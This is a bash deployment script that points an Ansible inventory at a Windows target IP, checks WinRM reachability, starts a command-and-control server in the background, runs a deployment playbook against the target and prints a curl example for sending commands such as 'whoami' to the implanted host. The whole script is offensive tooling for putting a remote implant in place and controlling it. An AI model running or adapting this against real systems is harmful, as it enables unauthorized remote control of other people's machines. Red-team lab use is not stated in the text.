#!/bin/bash
# deploy.sh - Run with: ./deploy.sh <WINDOWS_IP>

if [ -z "$1" ]; then
    echo "Usage: ./deploy.sh <WINDOWS_IP>"
    exit 1
fi

WINDOWS_IP=$1
SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"

echo "[*] Updating inventory.ini with target IP: $WINDOWS_IP"
sed -i "s/ansible_host=.*/ansible_host=$WINDOWS_IP/" inventory.ini

echo "[*] Testing connectivity..."
PING_RESULT=$(ansible windows -i inventory.ini -m win_ping 2>&1)

if echo "$PING_RESULT" | grep -q "pong"; then
    echo "[+] Connectivity confirmed - target is reachable"
else
    echo "[-] Connectivity failed. Output:"
    echo "$PING_RESULT"
    echo ""
    echo "Make sure WinRM is enabled on the target and try again."
    exit 1
fi

echo "[*] Starting C2 server in background..."
sudo python3 "$SCRIPT_DIR/c2_server.py" &
C2_PID=$!
echo "[+] C2 server started with PID $C2_PID"

echo "[*] Running deployment playbook..."
ansible-playbook deploy.yml -i inventory.ini

echo ""
echo "[+] Deployment complete."
echo "[+] C2 server is running in background (PID $C2_PID)"
echo ""

# Get hostname automatically
HOSTNAME=$(ansible windows -i inventory.ini -m win_shell -a "hostname" 2>&1 | grep -v "CHANGED" | grep -v "^$" | tail -1 | tr -d '[:space:]')
echo "[+] Target hostname: $HOSTNAME"
echo ""
echo "To issue commands:"
echo "  curl -sk -X POST https://localhost/issue \\"
echo "    -H 'Content-Type: application/json' \\"
echo "    -d '{\"id\": \"$HOSTNAME\", \"cmd\": \"whoami\"}'"
echo ""
echo "To view C2 output, check your terminal or run:"
echo "  tail -f /tmp/c2.log"